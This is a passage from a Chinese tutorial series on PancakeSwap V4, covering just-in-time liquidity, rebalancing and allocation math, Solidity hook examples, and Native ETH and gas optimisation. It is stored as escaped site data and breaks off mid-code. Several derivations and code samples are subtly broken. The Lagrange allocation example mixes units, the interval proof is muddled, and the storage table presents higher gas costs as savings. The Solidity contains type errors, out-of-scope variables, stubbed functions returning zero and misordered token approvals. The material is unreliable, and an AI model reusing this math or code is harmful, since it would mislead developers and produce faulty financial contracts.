$66,666.67\n\n场景1：小额交易\nL = $10,000\nslip = 0.5% = 0.005\n\nL × slip = $10,000 × 0.005 = $50\n\n$50 &lt; $66,666.67\n不利 ❌\n\n场景2：大额交易\nL = $100,000\nslip = 1.0% = 0.01\n\nL × slip = $100,000 × 0.01 = $1,000\n\n$1,000 &gt; $66,666.67\n有利 ✓\n\n2.3 JIT策略\n策略1：预测交易\n预测模型：\nP(Trade | State) = f(State)\n\n其中：\n- State: 当前状态（价格、流动性、历史等）\n- P(Trade | State): 交易概率\n\n触发条件：\n如果 P(Trade | State) × E[fee_earned | Trade] &gt; 2 × C_gas:\n    添加JIT流动性\n\n策略2：池内存入侦测（Mempool Monitoring）\n1. 监控mempool中的pending交易\n2. 识别大额swap交易\n3. 在交易确认前添加流动性\n4. 交易确认后立即移除\n\n数学分析：\n设：\n\nT_tx: 交易确认时间\nT_add: 添加流动性时间\nT_remove: 移除流动性时间\nProb_confirmed: 交易确认概率\n\n成功概率：\nP_success = 1 if T_add &lt; T_tx and T_tx &lt; T_remove\n          0 otherwise\n\n期望收益：\nE[Net_Profit] = P_success × (fee × ΔV - 2 × C_gas) +\n                (1 - P_success) × (-2 × C_gas)\n             = P_success × fee × ΔV - 2 × C_gas\n\n有利条件：\nE[Net_Profit] &gt; 0\n⇔ P_success × fee × ΔV &gt; 2 × C_gas\n\n2.4 JIT Hook实现\ncontract JITLiquidityHook {\n    address public pool;\n    address public liquidityToken;\n    uint256 public liquidityAmount;\n \n    // JIT配置\n    struct JITConfig {\n        uint256 minTradeSize;      // 最小交易量\n        uint256 minSlippage;        // 最小滑点\n        uint256 maxAddTime;         // 最大添加时间（秒）\n        uint256 maxRemoveTime;     // 最大移除时间（秒）\n    }\n \n    JITConfig public config;\n \n    // 追踪状态\n    struct JITState {\n        bool liquidityAdded;\n        uint256 addedTimestamp;\n        int24 tickLower;\n        int24 tickUpper;\n    }\n \n    JITState public jitState;\n \n    constructor(\n        address _pool,\n        address _liquidityToken,\n        uint256 _liquidityAmount,\n        JITConfig memory _config\n    ) {\n        pool = _pool;\n        liquidityToken = _liquidityToken;\n        liquidityAmount = _liquidityAmount;\n        config = _config;\n    }\n \n    function beforeSwap(\n        address sender,\n        address recipient,\n        int256 amount0,\n        int256 amount1,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external returns (bytes memory) {\n        // 检查是否需要添加JIT流动性\n        bool shouldAdd = shouldAddJIT(amount0, amount1);\n \n        if (shouldAdd) {\n            addJITLiquidity();\n        }\n \n        return bytes(&quot;&quot;);\n    }\n \n    function shouldAddJIT(\n        int256 amount0,\n        int256 amount1\n    ) internal view returns (bool) {\n        // 计算交易量\n        uint256 tradeSize = max(abs(amount0), abs(amount1));\n \n        // 检查最小交易量\n        if (tradeSize &lt; config.minTradeSize) {\n            return false;\n        }\n \n        // 获取当前价格\n        uint160 currentSqrtPrice = getCurrentSqrtPrice();\n \n        // 计算滑点（简化）\n        // 实际实现应该更精确\n        uint256 slippage = calculateSlippage(\n            currentSqrtPrice,\n            sqrtPriceLimitX96\n        );\n \n        // 检查最小滑点\n        if (slippage &lt; config.minSlippage) {\n            return false;\n        }\n \n        return true;\n    }\n \n    function addJITLiquidity() internal {\n        require(!jitState.liquidityAdded, &quot;Liquidity already added&quot;);\n \n        // 计算价格区间（围绕当前价格）\n        (int24 tickLower, int24 tickUpper) = calculateTickRange();\n \n        // 添加流动性\n        (uint256 amount0, uint256 amount1, uint128 liquidity) =\n            IPancakeV4Pool(pool).mint(\n                address(this),\n                tickLower,\n                tickUpper,\n                uint128(liquidityAmount),\n                bytes(&quot;&quot;)\n            );\n \n        // 更新状态\n        jitState.liquidityAdded = true;\n        jitState.addedTimestamp = block.timestamp;\n        jitState.tickLower = tickLower;\n        jitState.tickUpper = tickUpper;\n \n        // 授权池子使用代币\n        IERC20(liquidityToken).approve(pool, amount0);\n        IERC20(liquidityToken).approve(pool, amount1);\n    }\n \n    function afterSwap(\n        address sender,\n        address recipient,\n        int256 amount0,\n        int256 amount1,\n        uint160 sqrtPriceX96,\n        int24 tick,\n        bytes calldata data\n    ) external returns (bytes memory) {\n        // 检查是否需要移除流动性\n        if (jitState.liquidityAdded) {\n            removeJITLiquidity();\n        }\n \n        return bytes(&quot;&quot;);\n    }\n \n    function removeJITLiquidity() internal {\n        require(jitState.liquidityAdded, &quot;No liquidity to remove&quot;);\n \n        // 检查时间约束\n        require(\n            block.timestamp - jitState.addedTimestamp &lt;= config.maxRemoveTime,\n            &quot;Too late to remove&quot;\n        );\n \n        // 移除流动性\n        IPancakeV4Pool(pool).burn(\n            jitState.tickLower,\n            jitState.tickUpper,\n            uint128(liquidityAmount)\n        );\n \n        // 重置状态\n        jitState.liquidityAdded = false;\n        jitState.addedTimestamp = 0;\n    }\n \n    function calculateTickRange() internal view returns (int24, int24) {\n        // 获取当前tick\n        int24 currentTick = getCurrentTick();\n \n        // 计算区间宽度（基于配置）\n        int24 tickWidth = calculateTickWidth();\n \n        return (currentTick - tickWidth, currentTick + tickWidth);\n    }\n \n    function calculateTickWidth() internal pure returns (int24) {\n        // 简化：固定宽度\n        // 实际应该根据波动率计算\n        return 100;  // 100 ticks ≈ 1%\n    }\n \n    function getCurrentSqrtPrice() internal view returns (uint160) {\n        // 从池子获取当前价格\n        // 实现略\n        return 0;\n    }\n \n    function getCurrentTick() internal view returns (int24) {\n        // 从池子获取当前tick\n        // 实现略\n        return 0;\n    }\n \n    function calculateSlippage(\n        uint160 sqrtPriceStart,\n        uint160 sqrtPriceEnd\n    ) internal pure returns (uint256) {\n        // 简化计算\n        // 实际应该更精确\n        uint256 priceStart = (uint256(sqrtPriceStart) ** 2) &gt;&gt; 192;\n        uint256 priceEnd = (uint256(sqrtPriceEnd) ** 2) &gt;&gt; 192;\n \n        if (priceEnd &gt;= priceStart) {\n            return ((priceEnd - priceStart) * 1e18) / priceStart;\n        } else {\n            return ((priceStart - priceEnd) * 1e18) / priceStart;\n        }\n    }\n \n    function max(int256 a, int256 b) internal pure returns (int256) {\n        return a &gt;= b ? a : b;\n    }\n \n    function abs(int256 x) internal pure returns (int256) {\n        return x &gt;= 0 ? x : -x;\n    }\n}\n\n3. 流动性再平衡\n3.1 再平衡触发条件\n条件1：价格偏离\n数学模型：\n设：\n\nP_center: 区间中心价格\nP_current: 当前价格\nthreshold: 偏离阈值\n\n偏离度：deviation = |P_current - P_center| / P_center\n\n触发条件：\ndeviation &gt; threshold\n\n条件2：费用收益下降\n数学模型：\n设：\n\nfee_rate(t): t时刻的费用收入\nE[fee_rate]: 期望费用收入\n\n收益率下降：\ndecline = (E[fee_rate] - fee_rate(t)) / E[fee_rate]\n\n触发条件：\ndecline &gt; threshold\n\n3.2 最优再平衡策略\n优化问题\n目标函数：\nmaximize: E[Return(L_new(t))]\n        = E[fee(L_new(t)) × V(t) - Cost_rebalance]\n\nwhere:\n- L_new(t): 再平衡后的流动性分配\n- Cost_rebalance: 再平衡成本\n\nsubject to:\n    Σ L_new_i(t) = L_total  （总流动性约束）\n    L_new_i(t) ≥ 0  （非负约束）\n    Cost_rebalance ≤ Cost_max  （成本约束）\n\n定理2：再平衡有利条件\n定理：再平衡有利当且仅当期望收益增量超过再平衡成本。\n证明：\n设：\n- R_old: 再平衡前的期望收益\n- R_new: 再平衡后的期望收益\n- C_rebalance: 再平衡成本\n\n净收益：\nΔR = R_new - R_old - C_rebalance\n\n有利条件：\nΔR &gt; 0\n⇔ R_new - R_old &gt; C_rebalance\n⇔ E[Return(L_new)] - E[Return(L_old)] &gt; C_rebalance\n⇔ E[ΔReturn] &gt; C_rebalance\n\n其中：\nE[ΔReturn] = E[fee(L_new) × V - fee(L_old) × V]\n            = E[(fee(L_new) - fee(L_old)) × V]\n\n因此：\nE[(fee(L_new) - fee(L_old)) × V] &gt; C_rebalance\n\n证毕。\n\n数值示例\n再平衡前：\n流动性分配：\n区间A [1800,1900]: L = $1,000\n区间B [1900,2000]: L = $2,000\n区间C [2000,2100]: L = $1,000\n总流动性：$4,000\n\n当前价格：1980 USDT（在区间B）\n\n期望收益（假设）：\nE[R_old] = $100/天\n\n再平衡后：\n预期价格：2050 USDT\n\n流动性分配：\n区间A [1800,1900]: L = $500\n区间B [1900,2000]: L = $1,500\n区间C [2000,2100]: L = $2,000\n总流动性：$4,000\n\n期望收益（假设）：\nE[R_new] = $150/天\n\n再平衡成本：\n移除区间A的$500：C1 = $5\n移除区间B的$500：C2 = $5\n添加到区间C的$1,000：C3 = $10\n\n总成本：\nC_rebalance = $5 + $5 + $10 = $20\n\n净收益：\nΔR = $150 - $100 - $20 = $30/天\n\n有利 ✓\n\n3.3 动态区间调整\n数学模型\n设：\n\nP_lower(t): t时刻的下界\nP_upper(t): t时刻的上界\nP_current(t): 当前价格\nσ(t): 波动率\n\n动态区间策略：\nP_lower(t) = P_current(t) × (1 - k × σ(t))\nP_upper(t) = P_current(t) × (1 + k × σ(t))\n\n其中：\n- k: 区间宽度系数（k &gt; 0）\n- σ(t): 波动率\n\n定理3：区间优化\n命题：最优区间宽度与波动率正相关。\n证明：\n目标：最大化收益\nmaximize: E[Return(L, P_lower, P_upper)]\n\n收益函数：\nReturn = fee × V_efficient\n\n其中：\nV_efficient = V × P(in_range)\n\nP(in_range): 价格在区间内的概率\n\n对于价格分布P(p)：\nP(in_range) = ∫_{P_lower}^{P_upper} P(p) dp\n\n假设价格服从正态分布N(μ, σ²)：\nP(in_range) = Φ((P_upper - μ)/σ) - Φ((P_lower - μ)/σ)\n\n其中Φ是标准正态分布的CDF\n\n令：\nx = (P_upper - μ)/σ = k  （上界偏离）\ny = (P_lower - μ)/σ = -k  （下界偏离）\n\n则：\nP(in_range) = Φ(k) - Φ(-k) = 2Φ(k) - 1\n\n目标函数：\nmaximize: E[Return] = E[fee × V × (2Φ(k) - 1)]\n\n对k求导：\nd/dk [E[Return]] = E[fee × V × 2φ(k)]\n                  = 2 × E[fee × V] × φ(k)\n\n其中φ(k)是标准正态分布的PDF：\nφ(k) = (1/√(2π)) × e^{-k²/2}\n\n令导数为0：\n2 × E[fee × V] × φ(k) = 0\n\n因为E[fee × V] &gt; 0：\nφ(k) = 0\n⇒ e^{-k²/2} = 0\n⇒ k → ∞\n\n但这会导致区间过宽，捕获大量非活跃流动性。\n\n因此，需要权衡：\n- 区间越宽：P(in_range)越大，但流动性分散\n- 区间越窄：流动性集中，但P(in_range)越小\n\n实际最优解取决于：\n- 波动率σ\n- 费用收入模型\n- Gas成本\n\n证毕。\n\n\n4. 流动性分配优化\n4.1 均值-方差优化\n模型\nmaximize: E[Return] - λ × Var[Return]\n\nwhere:\n- E[Return]: 期望收益\n- Var[Return]: 收益方差\n- λ: 风险厌恶系数（λ ≥ 0）\n\n期望收益\nE[Return] = E[Σ fee_i × V_i - IL_i]\n\n其中：\n- fee_i: 第i个区间的费用率\n- V_i: 第i个区间的交易量\n- IL_i: 第i个区间的无常损失\n\n收益方差\nVar[Return] = E[Return²] - E[Return]²\n\n简化假设：\n- 各区间收益独立\n- 无常损失可以忽略\n\n则：\nVar[Return] ≈ Σ Var[fee_i × V_i]\n\n4.2 拉格朗日乘数法\n优化问题\nmaximize: E[Return] - λ × Var[Return]\n\nsubject to:\n    Σ L_i = L_total  （总流动性约束）\n    L_i ≥ 0  （非负约束）\n\n拉格朗日函数\nL = E[Return] - λ × Var[Return] + γ × (Σ L_i - L_total)\n\n其中：\n- γ: 拉格朗日乘数\n\n一阶条件\n∂L/∂L_i = 0\n\n⇒ ∂E[Return]/∂L_i - λ × ∂Var[Return]/∂L_i + γ = 0\n\n假设：\nE[Return_i] = μ_i × L_i\nVar[Return_i] = σ_i² × L_i²\n\n则：\n∂E[Return]/∂L_i = μ_i\n∂Var[Return]/∂L_i = 2λ × σ_i² × L_i\n\n因此：\nμ_i - 2λ × σ_i² × L_i + γ = 0\n⇒ L_i = (μ_i + γ) / (2λ × σ_i²)\n\n4.3 计算实例\n参数设置：\nL_total = $100,000\nλ = 1（风险中性）\n\n三个区间：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n区间μ（期望收益率）σ²（方差）A0.05 (5%)0.01B0.08 (8%)0.02C0.12 (12%)0.04\n计算L_i：\n从约束：Σ L_i = L_total\n\n代入L_i的表达式：\n(μ_A + γ)/(2λ × σ_A²) + (μ_B + γ)/(2λ × σ_B²) + (μ_C + γ)/(2λ × σ_C²) = L_total\n\n代入数值：\n(0.05 + γ)/(2 × 1 × 0.01) + (0.08 + γ)/(2 × 1 × 0.02) + (0.12 + γ)/(2 × 1 × 0.04) = 100,000\n⇒ (0.05 + γ)/0.02 + (0.08 + γ)/0.04 + (0.12 + γ)/0.08 = 100,000\n\n设单位为$，转换为百分比：\n50 × (0.05 + γ) + 25 × (0.08 + γ) + 12.5 × (0.12 + γ) = 100\n⇒ 2.5 + 50γ + 2 + 25γ + 1.5 + 12.5γ = 100\n⇒ 6 + 87.5γ = 100\n⇒ γ = 94 / 87.5\n⇒ γ ≈ 1.0743\n\n计算各L_i：\n\nL_A = (0.05 + 1.0743) / (2 × 1 × 0.01)\n    = 1.1243 / 0.02\n    = 56.215\n\nL_B = (0.08 + 1.0743) / (2 × 1 × 0.02)\n    = 1.1543 / 0.04\n    = 28.858\n\nL_C = (0.12 + 1.0743) / (2 × 1 × 0.04)\n    = 1.1943 / 0.08\n    = 14.928\n\n验证：\nL_A + L_B + L_C = 56.215 + 28.858 + 14.928 = 100.001 ≈ 100,000 ✓\n\n转换为美元：\nL_A = $56,215\nL_B = $28,858\nL_C = $14,928\n\n\n5. 自动化再平衡Hook\ncontract AutoRebalanceHook {\n    // 配置\n    struct RebalanceConfig {\n        uint256 deviationThreshold;  // 价格偏离阈值\n        uint256 minReturnDiff;      // 最小收益差异\n        uint256 maxGasCost;         // 最大gas成本\n        uint256 rebalanceInterval;  // 再平衡间隔（秒）\n    }\n \n    RebalanceConfig public config;\n \n    // 状态\n    struct RebalanceState {\n        uint256 lastRebalanceTime;\n        int24 lastTick;\n        uint256[] currentLiquidity;\n    }\n \n    RebalanceState public state;\n \n    address public pool;\n \n    constructor(RebalanceConfig memory _config, address _pool) {\n        config = _config;\n        pool = _pool;\n    }\n \n    function afterSwap(\n        address sender,\n        address recipient,\n        int256 amount0,\n        int256 amount1,\n        uint160 sqrtPriceX96,\n        int24 tick,\n        bytes calldata data\n    ) external returns (bytes memory) {\n        // 检查是否需要再平衡\n        if (shouldRebalance(tick)) {\n            performRebalance();\n        }\n \n        return bytes(&quot;&quot;);\n    }\n \n    function shouldRebalance(int24 currentTick) internal view returns (bool) {\n        // 检查时间间隔\n        require(\n            block.timestamp - state.lastRebalanceTime &gt;= config.rebalanceInterval,\n            &quot;Too soon to rebalance&quot;\n        );\n \n        // 计算价格偏离\n        int24 lastTick = state.lastTick;\n        uint256 deviation = calculateDeviation(lastTick, currentTick);\n \n        // 检查偏离阈值\n        if (deviation &lt; config.deviationThreshold) {\n            return false;\n        }\n \n        // 估算再平衡成本\n        uint256 gasCost = estimateGasCost();\n \n        // 检查gas成本\n        if (gasCost &gt; config.maxGasCost) {\n            return false;\n        }\n \n        // 计算预期收益差异\n        uint256 expectedDiff = calculateExpectedReturnDiff(\n            lastTick,\n            currentTick\n        );\n \n        // 检查收益差异\n        if (expectedDiff &lt; config.minReturnDiff) {\n            return false;\n        }\n \n        return true;\n    }\n \n    function calculateDeviation(\n        int24 tick1,\n        int24 tick2\n    ) internal pure returns (uint256) {\n        // 计算价格偏离百分比\n        // price = 1.0001^tick\n        // deviation = |price1 - price2| / price1\n \n        // 简化计算：使用tick差\n        uint256 tickDiff = tick2 &gt; tick1\n            ? uint256(tick2 - tick1)\n            : uint256(tick1 - tick2);\n \n        // 近似：1% ≈ 100 ticks\n        return (tickDiff * 100) / 10000;  // 转换为百分比\n    }\n \n    function estimateGasCost() internal view returns (uint256) {\n        // 估算gas成本\n        // 实际实现应该更精确\n \n        uint256 gasPrice = tx.gasprice;\n        uint256 estimatedGas = 500000;  // 预估500k gas\n \n        return gasPrice * estimatedGas;\n    }\n \n    function calculateExpectedReturnDiff(\n        int24 lastTick,\n        int24 currentTick\n    ) internal view returns (uint256) {\n        // 计算预期收益差异\n        // 简化实现\n \n        // 获取当前收益\n        uint256 currentReturn = calculateExpectedReturn(currentTick);\n \n        // 获取优化后的收益\n        uint256 optimizedReturn = calculateOptimizedReturn(currentTick);\n \n        return optimizedReturn &gt; currentReturn\n            ? optimizedReturn - currentReturn\n            : 0;\n    }\n \n    function calculateExpectedReturn(int24 tick) internal view returns (uint256) {\n        // 简化实现\n        // 实际应该基于历史数据和模型\n        return 0;\n    }\n \n    function calculateOptimizedReturn(int24 tick) internal view returns (uint256) {\n        // 简化实现\n        // 实际应该基于优化算法\n        return 0;\n    }\n \n    function performRebalance() internal {\n        // 计算新的流动性分配\n        uint256[] memory newLiquidity = calculateNewLiquidity();\n \n        // 执行再平衡\n        executeRebalance(newLiquidity);\n \n        // 更新状态\n        state.lastRebalanceTime = block.timestamp;\n        state.lastTick = getCurrentTick();\n        state.currentLiquidity = newLiquidity;\n    }\n \n    function calculateNewLiquidity() internal view returns (uint256[] memory) {\n        // 简化实现\n        // 实际应该基于优化算法\n \n        // 返回新的流动性分配\n        uint256[] memory newLiquidity = new uint256[](3);\n        newLiquidity[0] = 50000;  // 区间A\n        newLiquidity[1] = 30000;  // 区间B\n        newLiquidity[2] = 20000;  // 区间C\n \n        return newLiquidity;\n    }\n \n    function executeRebalance(uint256[] memory newLiquidity) internal {\n        // 执行流动性再平衡\n        // 实现略\n    }\n \n    function getCurrentTick() internal view returns (int24) {\n        // 从池子获取当前tick\n        // 实现略\n        return 0;\n    }\n}\n\n6. 本章小结\n6.1 动态流动性机制总结\nmindmap\n  root((动态流动性))\n    JIT流动性\n      Just-In-Time原理\n      有利条件推导\n      策略实现\n    再平衡\n      触发条件\n      优化策略\n      动态区间\n    分配优化\n      均值-方差\n      拉格朗日乘数\n      数值计算\n    自动化\n      Hook实现\n      成本估算\n      收益计算\n\n6.2 关键公式速查\nJIT有利条件：\nL × slip &gt; 2 × C_gas / fee_rate\n\n动态区间：\nP_lower = P_current × (1 - k × σ)\nP_upper = P_current × (1 + k × σ)\n\n最优分配：\nL_i = (μ_i + γ) / (2λ × σ_i²)\n\n\n下一篇预告\n在下一篇文章中，我们将深入探讨Native ETH与Gas优化，包括：\n\nNative ETH的数学模型\nGas优化的数学推导\n实际代码实现\n性能对比分析\n\n\n参考资料\n\nPancakeSwap V4 动态流动性文档\nJIT流动性论文\n投资组合优化理论\n"},"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/06-Native-ETH与Gas优化":{"slug":"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/06-Native-ETH与Gas优化","filePath":"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/06-Native-ETH与Gas优化.md","title":"06-Native-ETH与Gas优化","links":[],"tags":[],"content":"死磕PancakeSwap V4（六）：Native ETH与Gas优化\n\n本文是「死磕PancakeSwap V4」系列的第六篇，深入剖析Native ETH的支持机制和Gas优化的数学原理。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V4架构与核心创新Singleton、Hooks、Native ETH02Hooks机制详解Hooks类型、数学模型、实现原理03Singleton架构与Flash Accounting存储优化、闪电记账、数学推导04费用系统的数学推导动态费用、数学证明、计算实例05动态流动性机制JIT流动性、数学建模、优化策略06Native ETH与Gas优化ETH直接支持、Gas优化数学07Hooks实战与最佳实践Hooks开发、安全实践、案例分析08V3到V4的迁移与升级迁移策略、兼容性、最佳实践\n\n1. Native ETH支持\n1.1 V3的ETH限制\n问题分析\n在V3中，ETH必须通过WETH包装：\nflowchart LR\n    subgraph V3Flow[&quot;V3 ETH交易流程&quot;]\n        A[用户持有ETH]\n        B[wrap: ETH → WETH&lt;br/&gt;gas: ~50k]\n        C[在池中交易WETH]\n        D[领取WETH]\n        E[unwrap: WETH → ETH&lt;br/&gt;gas: ~50k]\n    end\n\n    subgraph Costs[&quot;额外成本&quot;]\n        C1[wrap操作]\n        C2[unwrap操作]\n        C3[额外合约调用]\n        C4[用户体验差]\n    end\n\n    A --&gt; B --&gt; C --&gt; D --&gt; E\n    B --&gt; C1\n    E --&gt; C2\n    B --&gt; C3\n    E --&gt; C3\n\n    style Costs fill:#ffcdd2\n\nGas成本分析\nWrap操作：\n1. 调用WETH.deposit():\n   - 存储gas: ~2,100\n   - 转账gas: ~5,000\n   - 事件emit: ~1,500\n   - 总计: ~8,600 gas\n\n2. 检查allowance:\n   - 存储读取: ~2,100\n   - 总计: ~2,100 gas\n\n3. Approve操作:\n   - 存储写入: ~20,000\n   - 事件emit: ~1,500\n   - 总计: ~21,500 gas\n\nWrap总成本: ~32,200 gas\n\nUnwrap操作：\n1. 调用WETH.withdraw():\n   - 存储gas: ~2,100\n   - 转账gas: ~5,000\n   - 事件emit: ~1,500\n   - 总计: ~8,600 gas\n\nUnwrap总成本: ~8,600 gas\n\n总成本：\nTotal_Gas_V3 = Wrap + Swap + Unwrap\n              = 32,200 + 100,000 + 8,600\n              = 140,800 gas\n\n以30 gwei计算：\nGas_Fee = 140,800 × 30 / 1e9 = 0.004224 ETH\n\n以ETH价格$2000计算：\nUSD_Cost = 0.004224 × 2000 = $8.448\n\n1.2 V4的Native ETH支持\n机制设计\n在V4中，合约可以直接处理ETH：\nflowchart LR\n    subgraph V4Flow[&quot;V4 ETH交易流程&quot;]\n        A[用户持有ETH]\n        B[直接附带ETH&lt;br/&gt;进行交易]\n        C[池子接受ETH]\n        D[领取ETH]\n    end\n\n    subgraph Benefits[&quot;优势&quot;]\n        B1[节省~40k gas]\n        B2[简化用户体验]\n        B3[减少合约交互]\n    end\n\n    A --&gt; B --&gt; C --&gt; D\n    B --&gt; B1\n    B1 --&gt; B2\n    B2 --&gt; B3\n\n    style Benefits fill:#c8e6c9\n\n数学模型\nETH余额追踪：\n设：\n- eth_balance(t): t时刻的ETH余额\n- eth_received(t): 接收的ETH\n- eth_sent(t): 发送的ETH\n\n状态方程：\neth_balance(t+1) = eth_balance(t) + eth_received(t) - eth_sent(t)\n\n边界条件：\neth_balance(t) ≥ 0, ∀t  （不能为负）\n\nFlash Accounting中的ETH：\n净ETH变化：\nΔeth = eth_balance(final) - eth_balance(initial)\n\n结算条件：\nΔeth + Σ(Δbalance_i × price_i) = 0\n\n其中：\n- Δbalance_i: 代币i的余额变化\n- price_i: 代币i的价格（以ETH计价）\n\n定理1：Native ETH节省证明\n定理：Native ETH相比WETH包装节省gas。\n证明：\n设：\n- G_wrap: wrap操作gas成本\n- G_unwrap: unwrap操作gas成本\n- G_swap: swap操作gas成本\n\nV3总成本：\nGas_V3 = G_wrap + G_swap + G_unwrap\n\nV4总成本：\nGas_V4 = G_swap\n\n节省：\nSavings = Gas_V3 - Gas_V4\n        = G_wrap + G_unwrap\n\n实际数据：\nG_wrap ≈ 32,200 gas\nG_unwrap ≈ 8,600 gas\n\n因此：\nSavings ≈ 32,200 + 8,600 = 40,800 gas\n\n以30 gwei计算：\n节省的eth = 40,800 × 30 / 1e9 = 0.001224 ETH\n节省的usd = 0.001224 × 2000 = $2.448\n\n证毕。\n\n1.3 Native ETH实现\n核心代码\ncontract PancakeV4PoolManager {\n    // ETH余额追踪\n    uint256 public ethBalance;\n \n    modifier lock() {\n        require(unlocked, &quot;LOCKED&quot;);\n        unlocked = false;\n        _;\n        unlocked = true;\n    }\n \n    bool internal unlocked = true;\n \n    // 记录初始ETH余额\n    function _recordInitialEthBalance() internal {\n        ethBalance = address(this).balance;\n    }\n \n    // 计算净ETH变化\n    function _getEthDelta() internal view returns (int256) {\n        return int256(address(this).balance) - int256(ethBalance);\n    }\n \n    // 结算ETH\n    function _settleEth(int256 ethDelta, address recipient) internal {\n        require(ethDelta &gt;= 0, &quot;ETH balance deficit&quot;);\n \n        if (ethDelta &gt; 0) {\n            payable(recipient).transfer(uint256(ethDelta));\n        }\n \n        ethBalance = address(this).balance;\n    }\n \n    // Native ETH swap\n    function swapETH(\n        address recipient,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external payable lock returns (int256 amount0, int256 amount1) {\n        // 记录初始余额\n        _recordInitialEthBalance();\n        _recordInitialTokenBalance(token0);\n        _recordInitialTokenBalance(token1);\n \n        // 执行swap逻辑\n        // ...\n \n        // 计算净变化\n        int256 ethDelta = _getEthDelta();\n        (int256 delta0, int256 delta1) = _getTokenDeltas();\n \n        // 结算\n        _settleEth(ethDelta, recipient);\n        _settleTokens(delta0, delta1, recipient);\n \n        return (amount0, amount1);\n    }\n}\n\n2. Gas优化技术\n2.1 存储优化\n存储槽打包\nV3布局：\n// V3中分散的存储\nstruct Slot0 {\n    uint160 sqrtPriceX96;  // 160 bits\n    int24 tick;             // 24 bits\n    uint16 observationIndex; // 16 bits\n    uint16 observationCardinality; // 16 bits\n    uint16 observationCardinalityNext; // 16 bits\n    uint8 feeProtocol;      // 8 bits\n    bool unlocked;           // 1 bit\n}\n \n// 使用1个256位存储槽\nSlot0 public slot0;  // 1 slot\nV4布局：\n// V4中紧密打包的存储\nstruct OptimizedState {\n    // 第1个存储槽 (256 bits)\n    uint160 sqrtPriceX96;    // 160 bits\n    int24 tick;               // 24 bits\n    uint16 observationIndex;  // 16 bits\n    uint16 poolId;           // 16 bits\n    uint32 blockTimestamp;    // 32 bits\n    bool unlocked;            // 8 bits (实际只用1 bit)\n \n    // 第2个存储槽 (256 bits)\n    uint128 liquidity;        // 128 bits\n    uint16 feeProtocol0;      // 16 bits\n    uint16 feeProtocol1;      // 16 bits\n    uint32 observationCardinality; // 32 bits\n    uint32 padding;           // 64 bits\n}\n \nOptimizedState public state;  // 2 slots\n存储对比：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n版本存储槽数Gas成本(读)Gas成本(写)V312,10020,000V424,20020,000\n定理2：存储槽优化效果\n定理：存储槽打包可以减少gas成本。\n证明：\n设：\n- N: 需要存储的变量数量\n- B_i: 变量i的位数\n- G_read: 单个存储槽读取成本\n- G_write: 单个存储槽写入成本\n\n未优化时的槽数：\nSlots_unoptimized = N\n\n优化后的槽数：\nSlots_optimized = ceil(Σ B_i / 256)\n\n优化效果：\nSavings = (N - ceil(Σ B_i / 256)) × G_read\n\n对于V3/V4的Slot0：\n\nV3:\nN = 1\nΣ B_i = 160 + 24 + 16 + 16 + 16 + 8 + 1 = 241\nSlots = 1\n\nV4:\nN = 2\nΣ B_i = 256 + 256 = 512\nSlots = 2\n\n虽然V4使用了2个槽，但打包了更多数据\n\n实际效果：\n- 读取多个字段时，可能只需要1-2次SLOAD\n- 更新多个字段时，可能只需要1-2次SSTORE\n\n证毕。\n\n2.2 内存优化\n内存变量复用\nV3实现：\nfunction swap(...) {\n    // 每次都声明新变量\n    uint160 sqrtPriceX96 = slot0.sqrtPriceX96;\n    int24 tick = slot0.tick;\n    uint128 liquidity = liquidity;\n \n    // ... 使用变量\n}\nV4优化：\nfunction swap(...) {\n    // 使用内存指针\n    Slot0 memory slot0Cache = slot0;\n    uint128 liquidityCache = liquidity;\n \n    // ... 复用缓存变量\n \n    // 最后一次性写回\n    liquidity = liquidityCache;\n}\n定理3：内存缓存优化\n定理：内存缓存可以减少存储访问次数。\n证明：\n设：\n- n: 访问同一存储变量的次数\n- G_sload: SLOAD操作成本（~2,100 gas冷，~100 gas热）\n- G_mload: MLOAD操作成本（~3 gas）\n\n未优化（每次都读取存储）：\nGas_unoptimized = n × G_sload\n\n优化（内存缓存）：\nGas_optimized = G_sload + (n-1) × G_mload\n\n优化效果：\nSavings = Gas_unoptimized - Gas_optimized\n        = n × G_sload - (G_sload + (n-1) × G_mload)\n        = (n-1) × G_sload - (n-1) × G_mload\n        = (n-1) × (G_sload - G_mload)\n\n假设 n=5, G_sload=2,100, G_mload=3:\n\nSavings = (5-1) × (2,100 - 3)\n        = 4 × 2,097\n        = 8,388 gas\n\n证毕。\n\n2.3 循环优化\n循环展开\nV3实现：\nfor (uint256 i = 0; i &lt; 10; i++) {\n    balance += userBalances[i];\n}\nV4优化：\nbalance += userBalances[0];\nbalance += userBalances[1];\nbalance += userBalances[2];\nbalance += userBalances[3];\nbalance += userBalances[4];\nbalance += userBalances[5];\nbalance += userBalances[6];\nbalance += userBalances[7];\nbalance += userBalances[8];\nbalance += userBalances[9];\n定理4：循环展开优化\n定理：循环展开可以减少循环开销。\n证明：\n设：\n- n: 循环次数\n- G_loop: 单次循环开销（~15-20 gas）\n- G_iteration: 单次迭代内容\n\n未优化（循环）：\nGas_unoptimized = n × (G_loop + G_iteration)\n\n优化（展开）：\nGas_optimized = n × G_iteration\n\n优化效果：\nSavings = Gas_unoptimized - Gas_optimized\n        = n × G_loop\n\n假设 n=10, G_loop=20:\n\nSavings = 10 × 20 = 200 gas\n\n证毕。\n\n2.4 函数内联\n定理5：函数内联优化\n定理：内联小函数可以减少调用开销。\n证明：\n设：\n- n: 函数调用次数\n- G_call: 函数调用开销（~40-60 gas）\n- G_function: 函数内容gas\n\n未优化（调用）：\nGas_unoptimized = n × (G_call + G_function)\n\n优化（内联）：\nGas_optimized = n × G_function\n\n优化效果：\nSavings = Gas_unoptimized - Gas_optimized\n        = n × G_call\n\n假设 n=5, G_call=50:\n\nSavings = 5 × 50 = 250 gas\n\n证毕。\n\nV4内联示例\n// 内联小函数\nfunction min(uint256 a, uint256 b) internal pure returns (uint256) {\n    return a &lt; b ? a : b;\n}\n \n// 